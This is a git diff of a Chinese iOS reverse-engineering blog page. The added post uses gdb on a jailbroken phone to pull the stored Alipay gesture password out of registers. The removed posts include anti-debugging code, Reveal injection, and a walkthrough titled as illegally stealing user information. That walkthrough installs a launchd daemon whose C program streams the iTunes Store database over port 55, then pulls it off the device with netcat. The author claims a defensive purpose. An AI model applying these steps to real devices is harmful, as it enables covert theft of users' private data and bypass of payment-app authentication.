+<p>为了确定应该如何设置断点，不得不反汇编程序来作为参考了。</p>
+
+<p>在前面的文章提到过，支付宝 app 的手势密码校验处理非常严谨，没有抛出 BOOL 判断的方法让我们可以直接修改返回值跳过验证，而是将全部操作封在了</p>
+
+<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
+</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="k">-</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span><span class="nf">gestureInputView:</span><span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nv">view</span> <span class="nf">didFinishWithPassword:</span><span class="p">(</span><span class="kt">id</span><span class="p">)</span><span class="nv">password</span><span class="p">;</span>
+</span></code></pre></td></tr></table></div></figure></notextile></div>
+
+<p>于是，我反汇编了支付宝 app ，找到手势密码解锁的相关代码片段：</p>
+
+<div class="figure" id="figure-11-1">
+    <img src="http://ww2.sinaimg.cn/large/626e5d69gw1f75unaa1pzj20l90jyjw5.jpg" />
+
+    <p class="caption"><strong>图片 11.1</strong> guesture-password</p>
+</div>
+
+
+<p>红色箭头标注的地方，让人欣喜，这将是我们断点位置的最好选择。</p>
+
+<p>首先，查看一下相关程序段符号表：</p>
+
+<p><code>nm Portal | grep -i gestureinputview</code></p>
+
+<p>得到结果：</p>
+
+<p>nm Portal | grep -i getpassword</p>
+
+<p>得到结果：</p>
+
+<div class="figure" id="figure-11-2">
+    <img src="http://ww2.sinaimg.cn/large/626e5d69gw1f75unyvcgaj20fg04hwg4.jpg" />
+
+    <p class="caption"><strong>图片 11.2</strong> guesture-password2</p>
+</div>
+
+
+<p>确定了了关键函数的输出符号。</p>
+
+<p>启动支付宝 app ，并 gdb 该进程：
+<code>gdb -q -p 671</code></p>
+
+<p>在上述两个函数位置设置断点：
+<div class="figure" id="figure-11-3">
+    <img src="http://ww4.sinaimg.cn/large/626e5d69gw1f75up0u087j20hp02bgmb.jpg" />
+
+    <p class="caption"><strong>图片 11.3</strong> guesture-password3</p>
+</div>
+
+
+<p>可以通过 info breakpoints 查看断点：
+<div class="figure" id="figure-11-4">
+    <img src="http://ww3.sinaimg.cn/large/626e5d69gw1f75uppyzbzj20pj034my3.jpg" />
+
+    <p class="caption"><strong>图片 11.4</strong> guesture-password4</p>
+</div>
+
+
+<p>continue 到 getPassword 位置，打印函数栈：
+<div class="figure" id="figure-11-5">
+    <img src="http://ww4.sinaimg.cn/large/626e5d69gw1f75uq86ydyj20kn09en0w.jpg" />
+
+    <p class="caption"><strong>图片 11.5</strong> guesture-password5</p>
+</div>
+
+
+<p>我们可以确定了 getPassword 的返回地址是 0x00becb36 ,  对该地址加断点：</p>
+
+<p><code>b * 0xbecb36</code></p>
+
+<p>然后继续 continue ，程序将卡在上面的断点上。</p>
+
+<p>从上面的反汇编代码，我们可以知道，用户输入的密码为存在 r8 上，原始密码为存在 r0 上，我们直接打印出这两个寄存器的值：</p>
+
+<div class="figure" id="figure-11-6">
+    <img src="http://ww1.sinaimg.cn/large/626e5d69gw1f75ur9u2hlj20mm07pmxu.jpg" />
+
+    <p class="caption"><strong>图片 11.6</strong> guesture-password6</p>
+</div>
+
+
+<p>正确密码是个 “Z” 手势图画，而当前输入为 “一” 手势图画。
+可以得出结论，支付宝 app 的手势密码和大多数 app 一样，手势密码格式是字符串，9 个点分别对应字符 123456789 。</p>
+
+
+
+<p class="post-footer">
+                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
+</p></p></p></div></div>
+
+		
+		
+	</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+</div>
+	<div class="tags">
+
+
+	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
+
+
+</div>
+	
+	<div class="comments"><a href="/Blog/blog/2016/08/25/hackshi-zhan-tan-jiu-zhi-fu-bao-app-shou-shi-mi-ma/#disqus_thread">Comments</a></div>
+	
+</div>
+</article>
 
 
     <article class="post">
@@ -1281,466 +1892,6 @@ cy# assetsController.view.backgroundColor = [UIColor blueColor]
 </div>
 	
 	<div class="comments"><a href="/Blog/blog/2016/08/25/zu-zhi-gdb-yi-fu/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/Blog/blog/2016/08/25/rezu-zhi-gdb-yi-fu/">
-		
-			阻止 GDB 依附</a>
-	</h2>
-	<div class="entry-content">
-		<div class="container">
-<div class="item chapter">
-    <h1 class="title"><span class="label">4</span> <span class="title">阻止 GDB 依附</span></h1>
-    <p>GDB 是大多数 hackers 的首选，阻止 GDB 依附到应用的常规办法是：</p>
-
-<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-<span class="line-number">8</span>
-<span class="line-number">9</span>
-<span class="line-number">10</span>
-<span class="line-number">11</span>
-</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="cp">#import &lt;sys/ptrace.h&gt;  </span>
-</span><span class="line">
-</span><span class="line"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">charchar</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
-</span><span class="line"><span class="p">{</span>
-</span><span class="line"> <span class="err">#</span><span class="n">ifndef</span> <span class="n">DEBUG</span>
-</span><span class="line">    <span class="n">ptrace</span><span class="p">(</span><span class="n">PT_DENY_ATTACH</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
-</span><span class="line"> <span class="err">#</span><span class="n">endif</span>
-</span><span class="line">    <span class="err">@</span><span class="n">autoreleasepool</span> <span class="p">{</span>
-</span><span class="line">        <span class="k">return</span> <span class="n">UIApplicationMain</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="nb">nil</span><span class="p">,</span> <span class="n">NSStringFromClass</span><span class="p">([</span><span class="n">WQMainPageAppDelegate</span> <span class="n">class</span><span class="p">]));</span>
-</span><span class="line">    <span class="p">}</span>
-</span><span class="line"><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div>
-
-<p>但遗憾的是，iPhone 真实的运行环境是没有 sys/ptrace.h 抛出的。虽然 ptrace 方法没有被抛出, 但是不用担心，我们可以通过 dlopen 拿到它。</p>
-
-<p>dlopen： 当 path 参数为 0 是,他会自动查找<br />
-<code>$LD_LIBRARY_PATH, $DYLD_LIBRARY_PATH,  $DYLD_FALLBACK_LIBRARY_PATH</code> 和当前工作目录中的动态链接库。</p>
-
-<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-<span class="line-number">8</span>
-<span class="line-number">9</span>
-<span class="line-number">10</span>
-<span class="line-number">11</span>
-<span class="line-number">12</span>
-<span class="line-number">13</span>
-<span class="line-number">14</span>
-<span class="line-number">15</span>
-<span class="line-number">16</span>
-<span class="line-number">17</span>
-<span class="line-number">18</span>
-<span class="line-number">19</span>
-<span class="line-number">20</span>
-<span class="line-number">21</span>
-<span class="line-number">22</span>
-<span class="line-number">23</span>
-<span class="line-number">24</span>
-</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="cp">#import &lt;dlfcn.h&gt;  </span>
-</span><span class="line"> <span class="err">#</span><span class="n">import</span> <span class="o">&lt;</span><span class="n">sys</span><span class="o">/</span><span class="n">types</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
-</span><span class="line">
-</span><span class="line"><span class="k">typedef</span> <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ptrace_ptr_t</span><span class="p">)(</span><span class="kt">int</span> <span class="n">_request</span><span class="p">,</span> <span class="n">pid_t</span> <span class="n">_pid</span><span class="p">,</span> <span class="n">caddr_t</span> <span class="n">_addr</span><span class="p">,</span> <span class="kt">int</span> <span class="n">_data</span><span class="p">);</span>
-</span><span class="line"> <span class="err">#</span><span class="k">if</span> <span class="o">!</span><span class="n">defined</span><span class="p">(</span><span class="n">PT_DENY_ATTACH</span><span class="p">)</span>
-</span><span class="line"> <span class="err">#</span><span class="n">define</span> <span class="n">PT_DENY_ATTACH</span> <span class="mi">31</span>
-</span><span class="line"> <span class="err">#</span><span class="n">endif</span>  <span class="c1">// !defined(PT_DENY_ATTACH)  </span>
-</span><span class="line">
-</span><span class="line"><span class="kt">void</span> <span class="n">disable_gdb</span><span class="p">()</span> <span class="p">{</span>
-</span><span class="line">    <span class="kt">void</span><span class="o">*</span> <span class="n">handle</span> <span class="o">=</span> <span class="n">dlopen</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">RTLD_GLOBAL</span> <span class="o">|</span> <span class="n">RTLD_NOW</span><span class="p">);</span>
-</span><span class="line">    <span class="n">ptrace_ptr_t</span> <span class="n">ptrace_ptr</span> <span class="o">=</span> <span class="n">dlsym</span><span class="p">(</span><span class="n">handle</span><span class="p">,</span> <span class="s">&quot;ptrace&quot;</span><span class="p">);</span>
-</span><span class="line">    <span class="n">ptrace_ptr</span><span class="p">(</span><span class="n">PT_DENY_ATTACH</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-</span><span class="line">    <span class="n">dlclose</span><span class="p">(</span><span class="n">handle</span><span class="p">);</span>
-</span><span class="line"><span class="p">}</span>
-</span><span class="line">
-</span><span class="line"><span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="n">charchar</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
-</span><span class="line"><span class="p">{</span>
-</span><span class="line"> <span class="err">#</span><span class="n">ifndef</span> <span class="n">DEBUG</span>
-</span><span class="line">    <span class="n">disable_gdb</span><span class="p">();</span>
-</span><span class="line"> <span class="err">#</span><span class="n">endif</span>
-</span><span class="line">    <span class="err">@</span><span class="n">autoreleasepool</span> <span class="p">{</span>
-</span><span class="line">        <span class="k">return</span> <span class="n">UIApplicationMain</span><span class="p">(</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="nb">nil</span><span class="p">,</span> <span class="n">NSStringFromClass</span><span class="p">([</span><span class="n">WQMainPageAppDelegate</span> <span class="n">class</span><span class="p">]));</span>
-</span><span class="line">    <span class="p">}</span>
-</span><span class="line"><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div>
-
-</div>
-</div>
-<p class="post-footer">
-                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-</div>
-	<div class="tags">
-
-
-	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/Blog/blog/2016/08/25/rezu-zhi-gdb-yi-fu/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/Blog/blog/2016/08/25/revealcha-kan-app-ui/">
-		
-			Reveal查看APP UI</a>
-	</h2>
-	<div class="entry-content">
-		<div class="container">
-<div class="item chapter">
-    <h1 class="title"><span class="label">3</span> <span class="title">使用 Reveal 分析他人 App</span></h1>
-    <h3>准备工作</h3>
-
-<p>1）已越狱的设备，并且已安装了 OpenSSH , MobileSubstrate 等实用工具( Cydia 源里安装)</p>
-
-<p>2）本地已安装了 Reveal</p>
-
-<h3>操作步骤</h3>
-
-<h4>拷贝 framework 和 dylib 到越狱机</h4>
-
-<div class="code code">
-<pre class="code">&nbsp;
-scp -r /Applications/Reveal.app/Contents/SharedSupport/iOS-Libraries/Reveal.framework root@192.168.0.X:/System/Library/Frameworks
-scp /Applications/Reveal.app/Contents/SharedSupport/iOS-Libraries/libReveal.dylib root@192.168.0.X:/Library/MobileSubstrate/DynamicLibraries</pre>
-</div>
-
-<h4>编辑 libReveal.plist</h4>
-
-<p>a.可以 ssh 登录到越狱机上，并且越狱机已安装了编辑器工具例如 nano，在 /Library/MobileSubstrate/DynamicLibraries/ 下创建文件 libReveal.plist ，指定 app 的 Bundle ，可以指定多个</p>
-
-<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="p">{</span>
-</span><span class="line">    <span class="n">Filter</span> <span class="o">=</span> <span class="p">{</span>
-</span><span class="line">         <span class="n">Bundles</span> <span class="o">=</span> <span class="p">(</span><span class="s">&quot;com.apple.AppStore&quot;</span><span class="p">);</span>
-</span><span class="line">    <span class="p">};</span>
-</span><span class="line"><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div>
-
-<p>b.也可以在本地创建好 libReveal.plist 在 scp 到指定位置 /Library/MobileSubstrate/DynamicLibraries/ 下</p>
-
-<h4>重启越狱机</h4>
-
-<p>a.执行 killall SpringBoard</p>
-
-<p>b.也可以重启设备</p>
-
-<p>然后就可以到 Reveal 看看别人的 app 怎么布局的了，苹果的appstore：</p>
-
-<div class="figure" id="figure-3-1">
-    <img src="http://ww2.sinaimg.cn/large/626e5d69gw1f75tvj27y1j21040s3woe.jpg" />
-
-    <p class="caption"><strong>图片 3.1</strong> reveal</p>
-</div>
-
-
-</div>
-</div>
-<p class="post-footer">
-                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-</div>
-	<div class="tags">
-
-
-	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/Blog/blog/2016/08/25/revealcha-kan-app-ui/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/Blog/blog/2016/08/24/lai-hu-%5B%3F%5D-zhou-nian-ji/">
-		
-			来沪一周年纪</a>
-	</h2>
-	<div class="entry-content">
-		<h1>题记</h1>
-<p>不知不觉，来沪一周年。特发此文，总结来沪一周年的收获。
-</p>
-<p>
-</p>
-<p class="post-footer">
-                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-</div>
-	<div class="tags">
-
-
-	<a class='category' href='/Blog/blog/categories/gan-wu/'>感悟</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/Blog/blog/2016/08/24/lai-hu-%5B%3F%5D-zhou-nian-ji/#disqus_thread">Comments</a></div>
-	
-</div>
-</article>
-
-
-    <article class="post">
-	<h2 class="title">
-		
-		<a href="/Blog/blog/2016/08/24/ru-he-fei-fa-qie-qu-yong-hu-xin-xi-%3F/">
-		
-			如何非法窃取用户信息？</a>
-	</h2>
-	<div class="entry-content">
-		<div class="container">
-<div class="item chapter">
-    <h1 class="title"><span class="label">2</span> <span class="title">后台 daemon 非法窃取用户 iTunesstore 信息</span></h1>
-    <p>本人郑重声明：并不鼓励窃取用户隐私等行为，一切 hack 学习都只是为了研究如何防御。OK，进入正题。</p>
-
-<h3>开机自启动</h3>
-
-<p>在 <a href="/Blog/blog/2016/08/19/ioshei-ke-gong-ju/">iOS 黑客工具</a>中，介绍了如何编译自己的 C 程序并手动启动。今天介绍如何使程序变为开机自启动。</p>
-
-<h4>首先打开 Xcode 创建一个 plist 属性文件，如下图所示：</h4>
-
-<div class="figure" id="figure-2-1">
-    <img src="http://ww3.sinaimg.cn/large/626e5d69gw1f74ojhy4upj20gg06cq46.jpg" />
-
-    <p class="caption"><strong>图片 2.1</strong> daemon1</p>
-</div>
-
-
-<p>其中要注意一下通信服务名，我定为 55 。用编辑器打开，即为：</p>
-
-<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-<span class="line-number">8</span>
-<span class="line-number">9</span>
-<span class="line-number">10</span>
-<span class="line-number">11</span>
-<span class="line-number">12</span>
-<span class="line-number">13</span>
-<span class="line-number">14</span>
-<span class="line-number">15</span>
-<span class="line-number">16</span>
-<span class="line-number">17</span>
-<span class="line-number">18</span>
-<span class="line-number">19</span>
-<span class="line-number">20</span>
-<span class="line-number">21</span>
-<span class="line-number">22</span>
-<span class="line-number">23</span>
-<span class="line-number">24</span>
-<span class="line-number">25</span>
-<span class="line-number">26</span>
-<span class="line-number">27</span>
-<span class="line-number">28</span>
-<span class="line-number">29</span>
-</pre></td><td class="code"><pre><code class="xml"><span class="line"><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
-</span><span class="line"><span class="cp">&lt;!DOCTYPE plist PUBLIC &quot;-//Apple//DTD PLIST 1.0//EN&quot; &quot;http://www.apple.com/DTDs/PropertyList-1.0.dtd&quot;&gt;</span>
-</span><span class="line"><span class="nt">&lt;plist</span> <span class="na">version=</span><span class="s">&quot;1.0&quot;</span><span class="nt">&gt;</span>
-</span><span class="line"><span class="nt">&lt;dict&gt;</span>
-</span><span class="line">    <span class="nt">&lt;key&gt;</span>Program<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">    <span class="nt">&lt;string&gt;</span>/usr/bin/ncdemo<span class="nt">&lt;/string&gt;</span>
-</span><span class="line">    <span class="nt">&lt;key&gt;</span>StandardErrorPath<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">    <span class="nt">&lt;string&gt;</span>/dev/null<span class="nt">&lt;/string&gt;</span>
-</span><span class="line">    <span class="nt">&lt;key&gt;</span>SessionCreate<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">    <span class="nt">&lt;true/&gt;</span>
-</span><span class="line">    <span class="nt">&lt;key&gt;</span>ProgramArguments<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">    <span class="nt">&lt;array&gt;</span>
-</span><span class="line">        <span class="nt">&lt;string&gt;</span>/usr/bin/ncdemo<span class="nt">&lt;/string&gt;</span>
-</span><span class="line">    <span class="nt">&lt;/array&gt;</span>
-</span><span class="line">    <span class="nt">&lt;key&gt;</span>inetdCompatibility<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">    <span class="nt">&lt;dict&gt;</span>
-</span><span class="line">        <span class="nt">&lt;key&gt;</span>Wait<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">        <span class="nt">&lt;false/&gt;</span>
-</span><span class="line">    <span class="nt">&lt;/dict&gt;</span>
-</span><span class="line">    <span class="nt">&lt;key&gt;</span>Sockets<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">    <span class="nt">&lt;dict&gt;</span>
-</span><span class="line">        <span class="nt">&lt;key&gt;</span>Listeners<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">        <span class="nt">&lt;dict&gt;</span>
-</span><span class="line">            <span class="nt">&lt;key&gt;</span>SockServiceName<span class="nt">&lt;/key&gt;</span>
-</span><span class="line">            <span class="nt">&lt;string&gt;</span>55<span class="nt">&lt;/string&gt;</span>
-</span><span class="line">        <span class="nt">&lt;/dict&gt;</span>
-</span><span class="line">    <span class="nt">&lt;/dict&gt;</span>
-</span><span class="line"><span class="nt">&lt;/dict&gt;</span>
-</span><span class="line"><span class="nt">&lt;/plist&gt;</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div>
-
-<p>最后，将 plist 文件 scp 至 <code>root@192.168.1.114:/System/Library/LaunchDaemons/</code>下 。</p>
-
-<h3>编写读取 iTunesstore 数据库程序</h3>
-
-<p>读取 itunesstored2.sqlitedb 信息，并输出到 stdout 中，便于我们读取。</p>
-
-<div class="bogus-wrapper"><notextile><figure class="code"><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class="line-number">1</span>
-<span class="line-number">2</span>
-<span class="line-number">3</span>
-<span class="line-number">4</span>
-<span class="line-number">5</span>
-<span class="line-number">6</span>
-<span class="line-number">7</span>
-<span class="line-number">8</span>
-<span class="line-number">9</span>
-<span class="line-number">10</span>
-<span class="line-number">11</span>
-<span class="line-number">12</span>
-<span class="line-number">13</span>
-<span class="line-number">14</span>
-<span class="line-number">15</span>
-<span class="line-number">16</span>
-<span class="line-number">17</span>
-<span class="line-number">18</span>
-<span class="line-number">19</span>
-</pre></td><td class="code"><pre><code class="objc"><span class="line"><span class="cp">#include &lt;stdio.h&gt;  </span>
-</span><span class="line"> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">fcntl</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
-</span><span class="line"> <span class="err">#</span><span class="n">include</span> <span class="o">&lt;</span><span class="n">stdlib</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;</span>
-</span><span class="line">
-</span><span class="line"> <span class="err">#</span><span class="n">define</span> <span class="n">FILE</span> <span class="s">&quot;/var/mobile/Library/com.apple.itunesstored/itunesstored2.sqlitedb&quot;</span>
-</span><span class="line">
-</span><span class="line"><span class="kt">int</span> <span class="n">main</span><span class="p">(){</span>
-</span><span class="line">    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">FILE</span><span class="p">,</span> <span class="n">O_RDONLY</span><span class="p">);</span>
-</span><span class="line">    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
-</span><span class="line">    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class="line">
-</span><span class="line">    <span class="k">if</span><span class="p">(</span><span class="n">fd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
-</span><span class="line">        <span class="k">return</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
-</span><span class="line">    <span class="k">while</span> <span class="p">((</span> <span class="n">ret</span> <span class="o">=</span> <span class="n">read</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">)))</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">){</span>
-</span><span class="line">        <span class="n">write</span><span class="p">(</span> <span class="n">fileno</span><span class="p">(</span><span class="n">stdout</span><span class="p">),</span> <span class="n">buf</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
-</span><span class="line">    <span class="p">}</span>
-</span><span class="line">    <span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
-</span><span class="line">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-</span><span class="line"><span class="p">}</span>
-</span></code></pre></td></tr></table></div></figure></notextile></div>
-
-<h3>编译、拷贝、签名</h3>
-
-<h4>编译方法上篇文章已经介绍清楚，这里不再重复，直接 ￥%￥＃%￥……%＃ 生成运行在 ARM 的 ncdemo</h4>
-
-<h4>将 ncdemo scp 到设备中，并登录</h4>
-
-<div class="code code">
-<pre class="code">$ scp ncdemo root@192.168.1.114:ncdemo
-$ ssh root@192.168.1.114</pre>
-</div>
-
-<h4>签名</h4>
-
-<div class="code code">
-<pre class="code"> #ldid -S ncdemo
- #mv ncdemo /usr/bin</pre>
-</div>
-
-<h3>抓取 iTunesstore 数据信息</h3>
-
-<p>这时，我们只需要利用 netcat，指定之前定义的服务名称，轻松在本地抓取设备 iTunesstore 信息.
-<code>$ nc 192.168.1.114 55 &gt; itunesstored2.sqlitedb</code></p>
-
-<h3>分析 iTunesstore 数据信息</h3>
-
-<p>好吧，这里就介绍个最简单的应用，利用string命令查看：
-<code>$ strings itunesstored2.sqlitedb</code></p>
-
-<p>于是乎，我们就清晰的得到了 iPhone/iPad 设备上都安装了哪些 app ：</p>
-
-<div class="figure" id="figure-2-2">
-    <img src="http://ww1.sinaimg.cn/large/626e5d69gw1f74ol56kfgj20df0gfgpo.jpg" />
-
-    <p class="caption"><strong>图片 2.2</strong> daemon2</p>
-</div>
-
-
-<p>当然，除了这些，你想干什么都可以……夜深了，先写到这里吧……</p>
-
-</div>
-</div>
-<p class="post-footer">
-                        written by <a href="http://ITMonkeyLife.github.io/Blog">Rick</a>&nbsp;posted at <a href="http://ITMonkeyLife.github.io/Blog">http://ITMonkeyLife.github.io/Blog</a></p>
-
-		
-		
-	</div>
-
-
-<div class="meta">
-	<div class="date">
-
-
-
-
-</div>
-	<div class="tags">
-
-
-	<a class='category' href='/Blog/blog/categories/ios/'>iOS</a>
-
-
-</div>
-	
-	<div class="comments"><a href="/Blog/blog/2016/08/24/ru-he-fei-fa-qie-qu-yong-hu-xin-xi-%3F/#disqus_thread">Comments</a></div>
 	
 </div>
 </article>
